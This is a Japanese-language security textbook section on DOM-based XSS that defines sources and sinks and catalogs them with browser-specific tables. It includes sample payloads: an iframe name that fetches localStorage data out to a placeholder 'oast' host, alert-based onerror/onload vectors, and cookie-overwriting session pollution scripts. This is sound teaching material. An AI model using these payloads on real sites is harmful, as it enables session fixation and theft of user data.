# DOMベースXSS の source と sink を読み解く（定義・入力源・危険な出力点の完全カタログ）

> **この節で分かること**
> - DOMベースXSS（DOM Based XSS）が、反射型・格納型XSSと「どこで注入が起きるか」で根本的に違うことを説明できる。
> - source（入力源）と sink（危険な出力点）という2つの概念を定義し、両者の間の「汚染フロー（taint flow）」がなぜ脆弱性の本体なのかを説明できる。
> - 実務で使う source を14種類のカテゴリで列挙し、`location.hash` / `document.cookie` / `window.name` / `postMessage` などが攻撃者にどこまで制御されるかを言える。
> - DOM系脆弱性のカテゴリ別に sink を対応づけ、`eval()` 系・`innerHTML` 系・jQuery 系がそれぞれ何を引き起こすかを表で引ける。
> - `setTimeout` が「第1引数が文字列のときだけ」sink になるといった、引数位置とブラウザ条件まで含めた sink の性質を読み取れる。
> - ソースコードに正規表現を当てて source/sink を機械的に洗い出す検出の第一歩を自分でできる。

**元資料**: https://qiita.com/nozomi2025/items/909d552cec761c6412f2 （原典は取得できず二次情報ベース。本節の内容は、同一テーマの一次資料である OWASP DOM based XSS Prevention Cheat Sheet、PortSwigger Web Security Academy、Stefano Di Paola の DOMXSS Wiki、HackTricks から構成した）
**関連する節**: 反射型・格納型XSSの節、DOM Invader と Trusted Types による検出・防御の節（本テーマの後半）

---

## 1. DOMベースXSS とは何か

### 1.1 ひとことで言うと

DOMベースXSS（DOM Based XSS）とは、サーバが生成するHTMLではなく、**ブラウザ内で実行中の JavaScript が、攻撃者に制御された入力を危険なAPIへ渡してしまう**ことで成立するクロスサイトスクリプティングのことである。XSSとは、攻撃者の用意した JavaScript を被害者のブラウザ上で実行させる脆弱性のこと。DOMとは、ブラウザがHTML文書をオブジェクトの木構造として扱う仕組み（Document Object Model）のこと。

DOMベースXSSは「第三の種類のXSS（XSS of the Third Kind）」とも呼ばれる。Amit Klein が2005年の論文 "DOM Based Cross Site Scripting or XSS of the Third Kind" で最初に体系化した、比較的新しい分類である。

### 1.2 なぜ「第三の種類」なのか — 反射型・格納型との根本的な違い

OWASP（Web アプリのセキュリティ標準を作る非営利団体）はXSSを大きく次の2系統に分ける。

- Reflected（反射型）または Stored（格納型）
- DOM Based XSS

両者の本質的な違いは「**攻撃がアプリケーションのどこで注入されるか**」にある。原文の要点を引用に近い形で示す。

- 「Reflected and Stored XSS are server side injection issues while DOM based XSS is a client (browser) side injection issue.」——反射型・格納型は**サーバ側の注入問題**、DOMベースXSSは**クライアント（ブラウザ）側の注入問題**である。
- 「Also, XSS attacks always **execute** in the browser.」——どの型でも、最終的に**実行はブラウザ**で起きる。
- 反射型/格納型では、リクエストをサーバが処理する最中に、信頼できない入力が動的にHTMLへ加えられる過程で注入が起きる。これに対しDOMベースXSSでは、**クライアント上の実行時に直接注入される**。

ここに、DOMベースXSSが「見つけにくい」と言われる決定的な理由がある。反射型・格納型なら、攻撃文字列がサーバのレスポンスHTMLに現れるので、サーバ側ログやWAF（Web Application Firewall、不正なリクエストを遮断する防御装置）で観測できる余地がある。ところがDOMベースXSSでは、**攻撃文字列がサーバのレスポンスに一切現れないことがある**。ブラウザ内のJavaScriptがURLのフラグメント（`#`以降）などから値を読み取って処理する場合、その値はそもそもサーバへ送信されないからだ。

### 1.3 責任は誰にあるか

コードがクライアント側で注入されるとはいえ、その JavaScript を書いて配信しているのはアプリケーション側である。

- 「All of this code originates on the server, which means it is the application owner's responsibility to make it safe from XSS, regardless of the type of XSS flaw it is.」——すべてのコードはサーバ由来なので、XSSの種別にかかわらず、安全にする責任はアプリケーション所有者にある。

つまり「クライアント側で起きるからサーバは無関係」という言い訳は成り立たない。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOMベースXSSの source/sink 完全解説（Qiita, nozomi2025） — https://qiita.com/nozomi2025/items/909d552cec761c6412f2
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限。`qiita.com:443` への接続が組織ポリシーで遮断され、アーカイブ経由の迂回も到達不能だった）。以下の記述はこの記事の内容ではなく、同一テーマの一次資料（OWASP・PortSwigger・DOMXSS Wiki・HackTricks）にもとづく要約である。
> **読みどころ**:
> 1. DOMベースXSSの定義部分で「サーバのレスポンスHTMLには攻撃文字列が現れない」点をこの記事がどう日本語で説明しているか。本節1.2 の説明と突き合わせて、source＝入力源／sink＝出力先・危険な関数という用語対応を確認する。
> 2. 記事が挙げる source と sink の一覧を、本節3章・4章のカタログと比較する。日本語圏の記事は `location.hash` を起点にした例を好む傾向があるので、優先順位の付け方に注目する。
> 3. 記事のサンプルコード（脆弱なコードと修正版）が `location.hash.split("#")[1]` → `document.write(x)` 型か、`innerHTML` 型か、`eval` 型か。修正版が `textContent` を使っているか。
> **代替手段**: 本節が根拠にした一次資料はすべて無料で公開されている。OWASP DOM based XSS Prevention Cheat Sheet、PortSwigger Web Security Academy の DOM-based ページ、DOMXSS Wiki（GitHub の wisec/domxsswiki）を直接開けばよい。

---

## 2. source と sink — 2つの用語の定義

DOMベースXSSを理解する鍵は、**source（入力源）** と **sink（出力点）** という2語に尽きる。

### 2.1 source とは

**source（ソース、入力源）** とは、攻撃者が値を左右できる入力プロパティのこと。DOMXSS Wiki（Stefano Di Paola）の定義を引用する。

```
- Source
an input that could be controlled by an external (untrusted) source.
```

「外部の（信頼できない）供給元によって制御されうる入力」である。PortSwigger はより具体的に述べる。

> A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control.

つまり source とは「攻撃者に制御されうるデータを受け取る JavaScript プロパティ」のこと。`location.search`（URLのクエリ文字列 `?name=...` を読むプロパティ）が典型例である。攻撃者はリンクを送りつけるだけでクエリ文字列を好きに指定できるので、制御が容易だからだ。最終的には**攻撃者が制御できるあらゆるプロパティが source 候補**であり、リファラURL（`document.referrer`）、ユーザのクッキー（`document.cookie`）、web message（`postMessage` で送られるメッセージ）も含まれる。

### 2.2 sink とは

**sink（シンク、出力点）** とは、渡された文字列をコードやマークアップとして解釈しうる、危険な出力先のこと。DOMXSS Wiki の定義。

```
- Sink
a sink is a potentially dangerous method that could lead to a vulnerability.
In this case a DOM Based Xss.
```

「脆弱性につながりうる、危険な可能性のあるメソッド」である。PortSwigger の定義も引用する。

> A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript.

`eval()` は、渡された引数を JavaScript として実行する関数なので sink である。HTML の sink の例は `document.body.innerHTML` で、これは攻撃者が悪意あるHTMLを注入して任意の JavaScript を実行させる余地を作る。

### 2.3 水道にたとえる

DOMXSS Wiki はこのデータの流れを**水道（aqueduct）の水流**にたとえている。

> In software, data flow can be thought as in water flow in aqueduct systems which starts from natural sources and ends to sinks.

水が自然の湧き水（source）から始まり排水口（sink）へと流れるように、ソフトウェアでもデータは source から始まって sink へ流れる。source は**アプリが信頼できない入力を受け取る起点**、sink は**その source 由来のデータが危険な形で使われ、機密性・完全性・可用性の喪失に至る点**である。

### 2.4 汚染フロー（taint flow）こそが脆弱性の本体

大事なのは、source があるだけ、sink があるだけでは脆弱性にならないという点だ。**source から sink へ、検証も無害化もされずにデータが流れる**とき、初めて脆弱性が成立する。HackTricks はこれを簡潔にまとめている。

- 「**Sources** are inputs that can be manipulated by attackers, including URLs, cookies, and web messages.」
- 「**Sinks** are potentially dangerous endpoints where malicious data can lead to adverse effects, such as script execution.」
- 「The risk arises when data flows from a source to a sink without proper validation or sanitation, enabling attacks like XSS.」——source から sink へ、適切な検証や無害化なしにデータが流れるときにリスクが生じる。

この「source→sink の未検証な流れ」を**汚染フロー（taint flow）** と呼ぶ。汚染（taint）とは、信頼できない入力が「汚れた」データとして識別され、無害化されるまで汚れたまま追跡される、という考え方のこと。バグハンターの仕事は、JavaScript を読んでこの汚染フローを追い、無害化のない経路を見つけることに尽きる。

```
[source]                     [sink]
location.search  ──(検証なし)──►  element.innerHTML
document.cookie  ──(検証なし)──►  eval()
window.name      ──(検証なし)──►  document.write()
event.data       ──(検証なし)──►  setTimeout(文字列)
      │                             │
   攻撃者が値を                そこに渡すと
   制御できる入口              コード/HTMLとして解釈される出口
```

HackTricks はこの種のXSSの探し方の難しさをこう述べる。

- 「This kind of XSS is probably the **hardest to find**, as you need to look inside the JS code, see if it's **using** any object whose **value you control**, and in that case, see if there is **any way to abuse** it to execute arbitrary JS.」——JS コードの内部を読み、自分が値を制御できるオブジェクトを使っている箇所を探し、それを任意 JS 実行に悪用できるかを確かめる必要があるため、最も見つけにくいXSSである。

### 2.5 レンダリングコンテキストと実行コンテキスト

sink の危険度を決めるのは「そのデータがどのコンテキスト（文脈）で解釈されるか」である。OWASP は2つのコンテキストを区別する。

- **レンダリングコンテキスト（rendering context）**: HTMLタグとその属性のパースに紐づく文脈。さらに **HTML / HTML属性 / URL / CSS** の4つに細分できる。
- **実行コンテキスト（execution context）**: JavaScript パーサによるスクリプトコードのパースと実行に紐づく文脈。

OWASP はHTML・HTML属性・URL・CSSの各コンテキストを、JavaScript 実行コンテキストの内側から到達できる**サブコンテキスト（subcontext）** と呼ぶ。

> In JavaScript code, the main context is JavaScript but with the right tags and context closing characters, an attacker can try to attack the other 4 contexts using equivalent JavaScript DOM methods.

JavaScript コード内では主たる文脈はJavaScriptだが、適切なタグと文脈を閉じる文字を使えば、攻撃者は残り4つのコンテキストを、対応するDOMメソッド経由で攻撃できる。パーサごとにスクリプトを実行しうる意味論が異なり、サブコンテキストごとにエンコードの扱いも変わる。この複雑さこそが、DOMベースXSS対策を難しくする本質である。

### 2.6 最小の脆弱コード例

OWASP が挙げる、JavaScript コンテキスト内のHTMLサブコンテキストで起きる脆弱コード。

```html
 <script>
 var x = '<%= taintedVar %>';
 var d = document.createElement('div');
 d.innerHTML = x;
 document.body.appendChild(d);
 </script>
```

`taintedVar` が汚染された値（source 由来）で、それが `innerHTML`（sink）へ流れている。もう一つ、`location.hash`（URLの `#` 以降）を source とする典型例。

```
<script>
var x = location.hash.split("#")[1];
document.write(x);
</script>
```

`location.hash` から取った値を `document.write()`（sink）へそのまま流している。これらが本節を通じて見ていく「汚染フロー」の最小形である。

---

## 3. source のカタログ（攻撃者はどこから値を注ぎ込むか）

ここからは「どこを突くか」の地図を作る。まず source を網羅する。

### 3.1 共通 source（Common sources）

PortSwigger・HackTricks・DOMXSS Wiki が共通して挙げる、代表的な source の一覧（原文のまま）。

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB(mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

### 3.2 カテゴリ別に整理する

DOMXSS Wiki のカテゴリ分類で並べ替えると、どこに何があるかが見通せる。

| カテゴリ | 含まれる source |
| --- | --- |
| location, documentURI and URL sources | `document.URL`, `document.documentURI`, `document.URLUnencoded`（IE 5.5以降のみ）, `document.baseURI`, `location`, `location.href`, `location.search`, `location.hash`, `location.pathname` |
| Cookie sources | `document.cookie` |
| Referrer source | `document.referrer` |
| Window Name source | `window.name` |
| History source | `history.pushState()`, `history.replaceState()`, `window.onpopstate` が受け取る state オブジェクト |
| Indirect sources（間接 source） | `localStorage`, `sessionStorage`, `IndexedDB`（`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`）, `Database`（Safari のみ）、サーバ応答に格納された過去データ |
| Other Objects sources | `opener`（IE 7以下のみ）, `parent`/`top`/`frames[i].obj`, `onmessage` イベントの `event.data`（postMessage） |

### 3.3 URLのどこまでがデコードされて取れるか

source から取れる文字は、URLのどの部分か（パス・クエリ・フラグメント）とブラウザによって変わる。DOMXSS Wiki が基準にする「古典的なURL書式」（原文のまま）。

```
scheme://user:pass@host/path/to/page.ext/Pathinfo;semicolon?search.location=value#hash=value&hash2=value2
```

検証に使うサンプルURL。

```
http://host/path/to/page.ext/test;test?test#test
```

Wiki は source ごとに「URLエンコードされずに素通しされる文字」の一覧を、ブラウザ別（IE 8、Firefox 3.6.15–4、Chrome 6、Opera 10.61）の表で示している。表の読み方（原文の "How to read tables"）は次の通り。

- **source**: JavaScript のオブジェクト名
- **pathInfo**: pathInfo 部でURLエンコードされない文字
- **Search**: search 部でURLエンコードされない文字
- **Hash**: hash 部でURLエンコードされない文字
- `[A-B]` の表記は ASCII の A から B までの区間全体を指す。
- 表に現れない文字は（`/[a-z0-9]/i` を除いて）URLエンコードされるものと見なす。

この表から読み取れる実務上の要点（数値は当時のブラウザ実測値）。

- **IE 8 の `document.URL` / `location` / `document.URLUnencoded` / `document.referrer` は Search 部で制御文字（1〜8, 11, 12, 14〜31）、空白 (32)、`"` (34)、`<` (60)、`>` (62) までデコードせず素通し**する。つまりIE系では `location.search` から `<` `>` `"` がそのまま取れた。
- Firefox 3.6.15–4 は pathInfo/Search で `%` `\` `^` `` ` `` `{` `|` `}` を素通しするが `'` はエンコードする。
- Chrome 6 系は `'` を素通しし、`\` `^` `{` `}` はエンコードする。
- Opera 10.61 は `[127-255]` の高位バイトまで素通しする。
- `document.documentURI` / `document.baseURI` は**IE 8 では undefined**、`document.URLUnencoded` は**IE専用**（他ブラウザで undefined）。

〔補足〕この表は2010〜2011年頃の実測であり、現行ブラウザでは `location.*` の正規化・エンコード挙動が変わっている。だから個別の数値を暗記するのではなく、「**ブラウザごとにどの文字が素通しされるかは異なる。だから source から取った値は自分で1文字ずつ確認する**」という方法論として身につけるのが正しい。

### 3.4 `window.name` — エンコードが一切効かない永続 source

`window.name` は特に強力な source である。

- 「Characters in `window.name` value are invariant to the way they have been given.」——値に**一切のエンコードが適用されない**。`window.name='a\x01b'` としてもそのまま保持される。
- `window.name` はページが存在する限り**永続する値**であり、代入されたオブジェクトの文字列表現へのキャストである。
- 「An attacker can set new windows names and frames with no restriction, and they will persist during navigation on any domain.」——攻撃者は新規ウィンドウ/フレームの名前を自由に設定でき、**ドメインをまたぐ遷移をしても値が保持される**。

HackTricks はこれを「暗黙のグローバルと `window.name` の悪用」として拡張する。宣言（`var`/`let`/`const`）なしに `name` を参照すると `window.name` に解決される。攻撃者はブラウジングコンテキスト名にHTML/JSを仕込んでおき、後から被害者側コードにそれを「信頼データ」としてレンダリングさせられる。

```html
<iframe name="<img src=x onerror=fetch('https://oast/?f='+btoa(localStorage.flag))>" src="https://target/page"></iframe>
```

```javascript
window.open('https://target/page', "<svg/onload=alert(document.domain)>")
```

アプリが後で `element.innerHTML = name` 相当を無害化なしで行うと、攻撃者制御の `window.name` 文字列が**対象オリジンで実行**され、DOM XSS が成立する。オリジンとは「スキーム＋ホスト＋ポート」の組で、ブラウザが「どこまでを同じ出所と見なすか」の単位のこと。

### 3.5 `document.cookie` — Cookie Parameter Pollution

`document.cookie` も source であり、その値も「invariant（エンコードで変形されない）」である。厄介なのは、同名クッキーが複数存在しうる点だ。RFC 2109 は path がより具体的なクッキーを先に送ると定めるが、path が同じでドメインが違う場合の順序は未定義で、**ほとんどのブラウザは古いクッキーを先に送る**。攻撃者はこれを使い、より具体的な path のクッキーを大量（ホスト上限まで。IE/Firefox は 50、Opera は 30）に設定して既存クッキーを実質的に上書きできる。実証シナリオ（原文のまま）。

```
    Time t - From: vi.ct.im/path/to/page/
    document.cookie="SESSION=TRUESESSION; path=/";

    Time t+1 - From: v2.ct.im/another/path/to/a/page/
    document.cookie="SESSION=FAKESESSION; path=/path/to/page; domain=.ct.im"

    Time t+2 - From: vi.ct.im/path/to/page/
    document.cookie
    returns
    "SESSION=FAKESESSION; SESSION=TRUESESSION;"
```

典型的な `getCookie` 実装は**最初の出現**を取るため、この例では `FAKESESSION` が返ってしまう（原文のまま）。

```javascript
getCookie = function (name) {
	var search = name + '=';
    var returnValue = '';

      if (document.cookie.length > 0) {
        offset = document.cookie.indexOf(search);
        if (offset != -1) {
          offset += search.length;
          var end = document.cookie.indexOf(';', offset);
          if (end == -1) {
            end = document.cookie.length;
          }
          returnValue = decodeURIComponent(document.cookie.substring(offset, end).replace(/\+/g, '%20'));
        }
      }

      return returnValue;
    };
```

逆に**最後の出現**を返す実装なら、攻撃者はより一般的な（path=/ の）クッキーを打てばよい。

```javascript
// From: v2.ct.im/another/path/to/a/page/
document.cookie="SESSION=FAKESESSION; path=/; domain=.ct.im"
```

これは**クッキーにおけるパラメータ汚染（Parameter Pollution）** の一例で、セッション固定だけでなく、アプリがそのクッキー値をどう使うか次第で JavaScript の制御フロー操作や古典的なDOM XSSにも使える。

### 3.6 `document.referrer` — IE のホスト名注入

`document.referrer`（どのページから来たかを示すURL）も source である。IEは**ホスト名に特殊文字を許した**ため、攻撃者はDNSワイルドカードで次のようなホスト名を用意できた。

```
    ">host<img%20src=s%20onerror=alert(1)>.attacker.com
```

そのリファラのホスト名部分をDOMに書くコードがあると悪用できた（原文のまま）。

```javascript
with(document)
 write('<sc'+"ript src="http://Host/image.gif?t="+c+"r="+(referrer.split("/")[2])+"></sc"+'ript>');
```

〔補足〕現行のChromium/Firefoxはホスト名に `<` `>` `"` を許さないため、この特定ベクタはIE固有の歴史的事例である。ただし「**リファラのホスト名部分を信頼してDOMに書く**」というコードパターン自体は今も脆弱設計であり、パターンとして覚える価値がある。

### 3.7 `history` — location へ値を流し込む source

`history.pushState()` と `history.replaceState()`（履歴を書き換えるAPI）は、正しく呼ぶと実際の `location` オブジェクトに影響する。

```js
history.pushState({state:'object'}, '', '?javascript:alert(1)');
alert(location.search) // alerts javascript:alert(1)
```

`location.href` はこの呼び出しで変化し、アドレスバー表示も変わる（ただし**実際のリダイレクトは起きない**）。`location` を使うスクリプトがあれば、履歴操作は各プロパティに悪性データを流す有効な source になる。さらに **state オブジェクト自体も source** で、`window.onpopstate` がそれを受け取ってページ描画に使えば攻撃に使える。

### 3.8 間接 source（Indirect sources）

HTML5のストレージ（`localStorage` / `sessionStorage` / `IndexedDB` / Safari の `Database`）は**間接 source**である。直接 source から得た値を一度保存し、後で安全でない形で読み戻して使うと危険になる。以前サーバ側に保存されたデータも、同じく間接的な経路になりうる。

### 3.9 その他のオブジェクト source（`opener` と Object Shadowing）

`opener`（IE 7以下のみ）、`parent`/`top`/`frames[i].obj`、postMessage の `event.data` もこのカテゴリに入る。IE 7以下は**クロスウィンドウ/クロスドメインでの `opener` 再定義**を許し、同一オリジンポリシー（Same-Origin Policy, SOP。異なるオリジン間のデータアクセスを制限する基本規則）が破れることが示された（IE 8で修正）。

```javascript
// From attacker.tld
window.aFrame.location="http://victim/PageUsingOpenerObject.html"
window.aFrame.opener={someAttr:"someValue", someAttr2: function(){return someReturnValue}}
```

被害ページが `window.opener.Message` をそのまま `document.writeln` に流すと、攻撃者は `opener.Message` にスクリプトを仕込んで実行させられる。

もう一つ **Object Shadowing** という手筋がある。内側フレームが top のオブジェクトの存在を確認するコードは、**同名の iframe 要素を追加する**ことで騙せる。

`http://vi.ct.im/page` 側:

```
 <script>
 if(top.globalObject!='someValue'){
   top.location=location.href.split('#')[0];
 }
</script>
```

top window 側:

```
<iframe name='globalObject'></iframe>
<iframe src='http://vi.ct.im/page#javascript:JsHere'></iframe>
```

`globalObject` という名前の iframe を置くと、`top.globalObject` がその iframe を指すようになり、判定を通り抜けてしまう。

---

## 4. sink のカタログ（値を注いだ先で何が起きるか）

source を洗い出したら、次は「その値がどの sink に着地するか」で被害の種類が決まる。

### 4.1 DOM XSS を直接引き起こす主要 sink

PortSwigger が挙げる、直接 DOM XSS に至る sink（原文のまま）。

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

jQuery（DOM操作を簡単にするJavaScriptライブラリ）で DOM XSS に至る関数。

```
add() after() append() animate() insertAfter() insertBefore()
before() html() prepend() replaceAll() replaceWith() wrap()
wrapInner() wrapAll() has() constructor() init() index()
jQuery.parseHTML() $.parseHTML()
```

### 4.2 カテゴリ別 sink 対応表（PortSwigger 分類）

DOMベースの脆弱性は XSS だけではない。同じ「汚染フロー」でも、着地する sink のカテゴリによって帰結が変わる。PortSwigger のカテゴリ別 sink 一覧（HackTricks 収録の表を再現）。

| **Open Redirect** | **Javascript Injection** | **DOM-data manipulation** | **jQuery** |
| --- | --- | --- | --- |
| `location` | `eval()` | `scriptElement.src` | `add()` |
| `location.host` | `Function() constructor` | `scriptElement.text` | `after()` |
| `location.hostname` | `setTimeout()` | `scriptElement.textContent` | `append()` |
| `location.href` | `setInterval()` | `scriptElement.innerText` | `animate()` |
| `location.pathname` | `setImmediate()` | `someDOMElement.setAttribute()` | `insertAfter()` |
| `location.search` | `execCommand()` | `someDOMElement.search` | `insertBefore()` |
| `location.protocol` | `execScript()` | `someDOMElement.text` | `before()` |
| `location.assign()` | `msSetImmediate()` | `someDOMElement.textContent` | `html()` |
| `location.replace()` | `range.createContextualFragment()` | `someDOMElement.innerText` | `prepend()` |
| `open()` | `crypto.generateCRMFRequest()` | `someDOMElement.outerText` | `replaceAll()` |
| `domElem.srcdoc` | **Local file-path manipulation** | `someDOMElement.value` | `replaceWith()` |
| `XMLHttpRequest.open()` | `FileReader.readAsArrayBuffer()` | `someDOMElement.name` | `wrap()` |
| `XMLHttpRequest.send()` | `FileReader.readAsBinaryString()` | `someDOMElement.target` | `wrapInner()` |
| `jQuery.ajax()` | `FileReader.readAsDataURL()` | `someDOMElement.method` | `wrapAll()` |
| `$.ajax()` | `FileReader.readAsText()` | `someDOMElement.type` | `has()` |
| **Ajax request manipulation** | `FileReader.readAsFile()` | `someDOMElement.backgroundImage` | `constructor()` |
| `XMLHttpRequest.setRequestHeader()` | `FileReader.root.getFile()` | `someDOMElement.cssText` | `init()` |
| `XMLHttpRequest.open()` | **Link manipulation** | `someDOMElement.codebase` | `index()` |
| `XMLHttpRequest.send()` | `someDOMElement.href` | `someDOMElement.innerHTML` | `jQuery.parseHTML()` |
| `jQuery.globalEval()` | `someDOMElement.src` | `someDOMElement.outerHTML` | `$.parseHTML()` |
| `$.globalEval()` | `someDOMElement.action` | `someDOMElement.insertAdjacentHTML` | **Client-side JSON injection** |
| **HTML5-storage manipulation** | **XPath injection** | `someDOMElement.onevent` | `JSON.parse()` |
| `sessionStorage.setItem()` | `document.evaluate()` | `document.write()` | `jQuery.parseJSON()` |
| `localStorage.setItem()` | `someDOMElement.evaluate()` | `document.writeln()` | `$.parseJSON()` |
| **Denial of Service** | **Document-domain manipulation** | `document.title` | **Cookie manipulation** |
| `requestFileSystem()` | `document.domain` | `document.implementation.createHTMLDocument()` | `document.cookie` |
| `RegExp()` | **Web-message manipulation** | `history.pushState()` | **WebSocket-URL poisoning** |
| **Client-Side SQL injection** | `postMessage()` | `history.replaceState()` | `WebSocket` |
| `executeSql()` | | | |

重要な注記（原文のまま）。

> The **`innerHTML`** sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`.

`innerHTML` に `<script>` を入れても現代ブラウザでは実行されず、`svg onload` も発火しない。実証には `img` や `iframe` などの代替要素を使う必要がある（例: `<img src=x onerror=alert(1)>`）。この事実を知らないと「脆弱なのに `<script>` を入れて発火せず、脆弱でないと誤判定する」失敗に陥る。

### 4.3 カテゴリ別の定義

各カテゴリが何を引き起こすかを整理する。

| カテゴリ | 定義（要旨） |
| --- | --- |
| **DOM-based open redirection** | 攻撃者制御データを、クロスドメインのナビゲーションを開始できる sink に書き込むと発生。リダイレクト先URLの先頭を制御できれば `javascript:alert(1)` のような任意コード実行も可能。 |
| **DOM-based cookie manipulation** | 攻撃者制御データをクッキーの値に組み込む。セッション追跡に関わるクッキーなら**セッション固定攻撃**に悪用できる。 |
| **DOM-based JavaScript injection** | 攻撃者制御データを **JavaScript コードとして実行**する。 |
| **Document-domain manipulation** | 攻撃者制御データで `document.domain` を設定する。`document.domain` は SOP の強制に中心的役割を果たし、異なるオリジンの2ページが同じ値を設定すると制限なく相互作用できる。 |
| **WebSocket-URL poisoning** | 制御可能なデータを WebSocket 接続先URLに使う。 |
| **DOM-based link manipulation** | 攻撃者制御データを、現在ページ内のナビゲーション先（リンク、フォームの送信先）に書き込む。 |
| **Ajax request(-header) manipulation** | 攻撃者制御データを、`XmlHttpRequest` で発行する Ajax リクエストに書き込む。 |
| **Local file-path manipulation** | 攻撃者制御データをファイル操作APIの `filename` 引数として渡す。別ユーザに任意のローカルファイルを開かせられる。 |
| **Client-side SQL injection** | 攻撃者制御データをクライアント側SQLクエリに安全でない形で組み込む。 |
| **HTML5-storage manipulation** | 攻撃者制御データをブラウザのHTML5ストレージに保存する。後で読み戻して安全でなく処理すると問題になる。 |
| **DOM-based XPath injection** | 攻撃者制御データを XPath クエリに組み込む。 |
| **Client-side JSON injection** | 攻撃者制御データを、JSONとしてパースされ処理される文字列に組み込む。 |
| **Web-message manipulation** | 攻撃者制御データを別ドキュメントへ web message として送る。受信側リスナが安全でなく扱うと脆弱。 |
| **DOM-data manipulation** | 攻撃者制御データを、UIやクライアント側ロジックで使うDOMフィールドに書き込む。 |
| **DOM-based denial of service** | 攻撃者制御データを、CPUやディスクを過剰消費させうるAPIへ安全でなく渡す。 |

この表の使い方はこうだ。汚染フローを見つけたら、着地先の sink がどのカテゴリに属するかを引く。`location.href` なら open redirect、`eval()` なら JavaScript injection、`document.cookie` なら cookie manipulation、という具合に、被害の性質が即座に分かる。

### 4.4 Direct Execution Sinks（引数位置とブラウザまで特定）

DOMXSS Wiki は「文字列を JavaScript としてパースする関数」を、危険な引数の位置まで特定して表にしている。「If it is possible to control, even partially, the vulnerable argument, then it is possible to execute JavaScript.」——脆弱な引数を部分的にでも制御できれば JavaScript を実行できる。

| Function Name | Argument | Browser | Example |
|---|---|---|---|
| `eval` | first | All | `eval("jsCode"+usercontrolledVal)` |
| `Function` | first if one, last if >1 | All | `Function("arg","jsCode"+usercontrolledVal)` |
| `setTimeout` | first _IIF_ it is a string | All | `setTimeout("jsCode"+usercontrolledVal,timeMs)` |
| `setInterval` | first _IIF_ it is a string | All | `setInterval("jsCode"+usercontrolledVal,timMs)` |
| `setImmediate` | first _IIF_ it is a string | IE 10+ | `setImmediate("jsCode"+usercontrolledVal)` |
| `execScript` | first | IE 6+ | `execScript("jsCode"+usercontrolledVal,"JScript")` |
| `crypto.generateCRMFRequest` | 5th | Firefox 2+ | `crypto.generateCRMFRequest('CN=0',0,0,null,'jsCode'+usercontrolledVal,...)` |
| `ScriptElement.src` | assignedValue | All | `script.src = usercontrolledVal` |
| `ScriptElement.text` | assignedValue | Explorer | `script.text = 'jsCode'+usercontrolledVal` |
| `ScriptElement.textContent` | assignedValue | All but IE<9 | `script.textContent = 'jsCode'+usercontrolledVal` |
| `ScriptElement.innerText` | assignedValue | All but Firefox | `script.innerText = 'jsCode'+usercontrolledVal` |
| anyTag.*onEventName* | assignedValue | All | `anyTag.onclick = 'jsCode'+usercontrolledVal` |

ここで最も重要なのは `_IIF_`（"if and only if"、〜の場合に限り）という条件だ。`setTimeout`/`setInterval`/`setImmediate` は、**第1引数が文字列の場合に限り**コード実行 sink になる。関数を渡す場合（`setTimeout(function(){...}, 100)`）は sink にならない。この区別を知らないと、安全な使い方を誤って脆弱と報告してしまう。

### 4.5 HTML Manipulation Sinks

「文字列をHTMLとして解釈する」sink の表。

| Sink | Argument | Browser | Note |
|---|---|---|---|
| `document.write` | any | All | |
| `document.writeln` | any | All | |
| `anyElement.innerHTML` | assigned value | All | |
| `Range.createContextualFragment` | first arg | All | |
| `HTMLButton.value` | assigned value | Explorer | `buttonTag.innerHTML` 代入と等価 |

### 4.6 jQuery sinks とバージョン条件

jQuery の `$()` は、渡した文字列がHTMLに見えるとHTMLフラグメントを生成する。バージョンによって発火条件が異なるので注意が必要だ。

- **`jQuery(htmlText)` と `$(htmlText)`**: 第1引数が既知のタグに一致するパターンを含むとHTMLフラグメントが生成される。
  - **バージョン 1.6.1 以降**は、htmlText が **`#` で始まらない場合のみ**悪用可能。
  - **バージョン 1.9.0 以降**は、htmlText が **`<` で始まる場合のみ**悪用可能。
- **`jQuery.parseHTML(htmlText)`**: バージョン **1.8.0** で導入。内部で `DIV.innerHTML` を使ってパースする。
- **`jQuery.globalEval(userContent)`**: `eval` sink と等価。
- element の **`add()` / `append()` / `after()` / `before()` / `html()` / `prepend()` / `replaceWith()` / `wrap()` / `wrapAll()`**: いずれもHTMLを挿入する。`html()` は `element.innerHTML = usercontent` と等価。
- 一般に、jQuery の **htmlString 型**を受け取るすべての関数。

原文は「**Warning:** This list is still far from being complete.」——この一覧はまだ完全からほど遠い、と警告している。列挙は出発点であって網羅ではない。

### 4.7 Set Location Sink（source にも sink にもなる）

`window.location`（`document.location`）とそのメンバは、値を読めば source、値を代入すればブラウザを別ページへ飛ばす sink になる。

```js
window.location = "http://example.com/a/page.ext?par=val#hash"
```

問題になるプロパティ: `location`, `location.href`, `location.pathname`, `location.search`, `location.protocol`, `location.hostname`。危険なメソッドは `location.assign` と `location.replace`（いずれも汚染引数の位置は第1引数）。

```js
taintedVariable=location.href.split("#")[1];
location.assign(taintedVariable);
```

IE 8 は左辺値にエンティティ（`&#x3a;` のようなHTML文字参照）があると元の文字にデコードした。

```js
 location="javascript&#x3a;alert(1)";
```

`&#x3a;` は `:` に変換され、`javascript:alert(1)` になる。Firefox・Opera・Chrome・Safari はこの変換をしない。

### 4.8 CSSText Sink

CSSに未エスケープの入力を入れる sink もある。多くはブラウザ固有だった。

| Browser | Version | 攻撃ベクタ | 影響 | 備考 |
|---|---|---|---|---|
| Opera | 10.63 | `-o-link:'javascript:alert(1)';-o-link-source:current` | クリックでJS実行 | ユーザ操作が必要 |
| Firefox | 3.x/4.x | `-moz-binding:url(//vi.ct.im/page?par=val#checkbox);` | JS実行 | 同一サイト限定（SOP準拠） |
| IE | 7/8 | `a:expression(write(1))` | JS実行 | ? |

